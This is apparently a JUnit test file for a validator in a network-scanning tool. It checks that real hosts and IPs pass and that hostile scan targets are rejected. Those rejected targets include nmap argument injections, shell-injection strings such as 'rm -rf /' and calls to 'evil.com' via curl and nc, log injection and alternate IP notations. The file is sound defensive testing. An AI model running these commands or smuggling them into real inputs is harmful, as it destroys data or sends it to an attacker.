package com.cyberscope.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

class TargetValidatorTest {

    @Nested
    @DisplayName("accepts legitimate targets")
    class ValidTargets {

        @ParameterizedTest(name = "{0} -> {1}")
        @CsvSource({
                "127.0.0.1,        127.0.0.1",
                "0.0.0.0,          0.0.0.0",
                "255.255.255.255,  255.255.255.255",
                "192.168.1.1,      192.168.1.1",
                "8.8.8.8,          8.8.8.8",
                "localhost,        localhost",
                "scanme.nmap.org,  scanme.nmap.org",
                "my-host.local,    my-host.local",
                "host1.example.com, host1.example.com",
                "a.b,              a.b"
        })
        void acceptsAndNormalises(String input, String expected) throws Exception {
            assertEquals(expected, TargetValidator.validate(input));
        }

        @Test
        @DisplayName("trims surrounding whitespace")
        void trimsWhitespace() throws Exception {
            assertEquals("10.0.0.1", TargetValidator.validate("  10.0.0.1  "));
        }

        @Test
        @DisplayName("lowercases hostnames, since DNS is case-insensitive")
        void lowercasesHostnames() throws Exception {
            assertEquals("scanme.nmap.org", TargetValidator.validate("SCANME.NMAP.ORG"));
        }

        @Test
        @DisplayName("strips the trailing root dot of a fully qualified name")
        void stripsTrailingDot() throws Exception {
            assertEquals("example.com", TargetValidator.validate("example.com."));
        }

        @Test
        @DisplayName("accepts a label of exactly 63 characters")
        void acceptsMaximumLabel() throws Exception {
            String host = "x".repeat(63) + ".com";
            assertEquals(host, TargetValidator.validate(host));
        }
    }

    @Nested
    @DisplayName("rejects argument injection")
    class ArgumentInjection {

        @ParameterizedTest
        @ValueSource(strings = {
                "-oA /etc/cron.d/pwn",
                "-iL /etc/passwd",
                "--script=http-vuln-cve2017-5638",
                "--interactive",
                "-sS",
                "--datadir=/tmp/evil",
                "-host.com"
        })
        void rejectsAnythingStartingWithHyphen(String input) {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate(input));
            assertTrue(e.getMessage().contains("must not begin with '-'"),
                    "expected the hyphen guard to fire, got: " + e.getMessage());
        }
    }

    @Nested
    @DisplayName("rejects shell metacharacters")
    class ShellMetacharacters {

        @ParameterizedTest
        @ValueSource(strings = {
                "1.1.1.1; rm -rf /",
                "1.1.1.1 && curl evil.com",
                "$(whoami)",
                "`id`",
                "1.1.1.1|nc evil.com 80"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }
    }

    @Nested
    @DisplayName("rejects alternate IP notations")
    class IpNotationBypasses {

        @ParameterizedTest
        @ValueSource(strings = {
                "010.1.1.1",
                "0177.0.0.1",
                "2130706433",
                "127.1",
                "0x7f.0.0.1",
                "256.1.1.1",
                "999.999.999.999",
                "1.2.3",
                "1.2.3.4.5",
                "192.168.1.1%eth0"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }
    }

    @Nested
    @DisplayName("rejects multi-target and log-injection payloads")
    class Injection {

        @ParameterizedTest
        @ValueSource(strings = {
                "1.1.1.1\n2.2.2.2",
                "1.1.1.1\r\nFAKE LOG ENTRY",
                "1.1.1.1\t2.2.2.2",
                "1.1.1.1 2.2.2.2"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }

        @Test
        @DisplayName("neutralises control characters when echoing input in the message")
        void sanitisesControlCharsInMessage() {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("1.1.1.1\r\nFAKE"));
            assertFalse(e.getMessage().contains("\n"), "message must not contain a newline");
            assertFalse(e.getMessage().contains("\r"), "message must not contain a return");
        }
    }

    @Nested
    @DisplayName("rejects malformed input")
    class MalformedInput {

        @ParameterizedTest
        @NullSource
        @ValueSource(strings = {
                "", "   ", ".", "a..b", "host-.com", "../../etc/passwd",
                "host_name.com",
                "exаmple.com",   // Cyrillic 'a' - homograph
                "café.com"       // non-ASCII
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }

        @Test
        @DisplayName("rejects a label longer than 63 characters")
        void rejectsOversizedLabel() {
            assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("x".repeat(64) + ".com"));
        }

        @Test
        @DisplayName("rejects a name longer than 253 characters")
        void rejectsOversizedName() {
            assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("a.".repeat(200) + "com"));
        }
    }

    @Nested
    @DisplayName("resists denial of service")
    class Performance {

        @Test
        @DisplayName("does not backtrack catastrophically on pathological input")
        void noCatastrophicBacktracking() {
            String pathological = "a".repeat(60) + "-".repeat(60) + "!";
            long start = System.nanoTime();
            for (int i = 0; i < 2000; i++) {
                assertThrows(InvalidTargetException.class,
                        () -> TargetValidator.validate(pathological));
            }
            long millis = (System.nanoTime() - start) / 1_000_000;
            assertTrue(millis < 2000, "2000 validations took " + millis + "ms");
        }
    }
}
